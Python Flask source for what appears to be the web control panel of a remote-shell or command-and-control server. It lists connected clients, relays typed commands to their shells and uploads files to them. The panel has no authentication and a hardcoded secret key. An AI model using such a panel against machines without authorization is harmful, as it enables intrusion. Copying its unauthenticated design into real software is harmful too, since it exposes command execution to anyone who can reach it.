import io
from threading import Thread

from flask import Flask, session, render_template, redirect, url_for, request, send_file

import models
from Server import server

app = Flask(__name__)
app.secret_key = "secret"


@app.route('/')
def hello():
    return redirect(url_for("clients"))


@app.route("/clients")
def clients():
    return render_template("clients.html", cls=server.clients)


@app.route("/shell/<shell_id>", methods=["POST", "GET"])
def shell(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if request.method == "GET":
        return render_template("shell.html", client=client)
    else:
        cmd = request.form["cmd"]
        if cmd == "clear":
            client.output = []
        else:
            output = server.handle_command(cmd, client)
            client.append_output(output)
        return render_template("shell.html", client=client)


@app.route("/shell/<shell_id>/upload_file", methods=["POST"])
def test(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if request.files:
        if "file" in request.files:
            file = request.files["file"]
            in_mem_file = io.BytesIO()
            file.save(in_mem_file)
            print(in_mem_file.getbuffer().nbytes)
            mem_file = models.MemFile(file.filename, in_mem_file)
            client.add_file(mem_file)
    return redirect(url_for("shell", shell_id=shell_id))


if __name__ == '__main__':
    thread = Thread(target=server.listen_for_clients)
    thread.start()
    app.run(host="0.0.0.0")
